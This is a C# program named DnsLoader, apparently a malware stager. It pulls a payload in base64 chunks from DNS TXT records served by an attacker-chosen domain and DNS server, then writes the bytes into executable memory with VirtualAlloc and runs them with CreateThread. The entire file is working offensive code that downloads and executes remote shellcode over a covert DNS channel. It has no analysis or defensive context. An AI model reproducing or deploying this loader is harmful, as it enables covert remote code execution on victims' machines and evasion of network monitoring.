using ARSoft.Tools.Net.Dns;
using System;
using System.Collections.Generic;
using System.Net;
using System.Runtime.InteropServices;

namespace DnsLoader
{
    class Program
    {
        static string dns;
        static void Main(string[] args)
        {
            string domain = args[0];
            dns = args[1];
            long len = QueryLength(domain);
            int requireReceive = int.Parse(args[2]);

            List<byte> bytes = new List<byte> { };
            for (int i = 0; i < len; i++)
            {
                int hasReceive = bytes.Count;
                if (hasReceive == len)
                {
                    Console.WriteLine("Received");
                    break;
                }
                string rev = ClientQuery("r." + hasReceive.ToString() + "." + requireReceive.ToString() + "." + domain);
                if (rev.Equals(null))
                {
                    Console.WriteLine("dns Query error");
                    return;
                }
                byte[] b = Convert.FromBase64String(rev);
                bytes.AddRange(b);
                //Console.WriteLine(rev);
            }

            Console.WriteLine(bytes.Count);
            if (bytes.Count != 0)
            {
                inject(bytes.ToArray());
            }
        }

        public static long QueryLength(string domain)
        {
            long len = 0;
            string l = ClientQuery("length." + domain);
            bool success = Int64.TryParse(l, out len);
            if (success)
            {
                return len;
            }
            else
            {
                return 0;
            }
        }


        public static String ClientQuery(string domain)
        {
            List<IPAddress> dnss = new List<IPAddress> { };
            dnss.AddRange(Dns.GetHostAddresses(dns));
            var dnsClient = new DnsClient(dnss, 60);
            DnsMessage dnsMessage = dnsClient.Resolve(domain, RecordType.Txt);
            if ((dnsMessage == null) || ((dnsMessage.ReturnCode != ReturnCode.NoError) && (dnsMessage.ReturnCode != ReturnCode.NxDomain)))
            {
                Console.WriteLine("DNS request failed");
                return null;
            }
            else
            {
                foreach (DnsRecordBase dnsRecord in dnsMessage.AnswerRecords)
                {
                    TxtRecord txtRecord = dnsRecord as TxtRecord;
                    if (txtRecord != null)
                    {
                        return txtRecord.TextData.ToString();
                    }
                }
                return null;
            }
        }


        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        public static void inject(Byte[] buffer)
        {
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)buffer.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buffer, 0x0000, (IntPtr)(funcAddr), buffer.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0x0000;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
}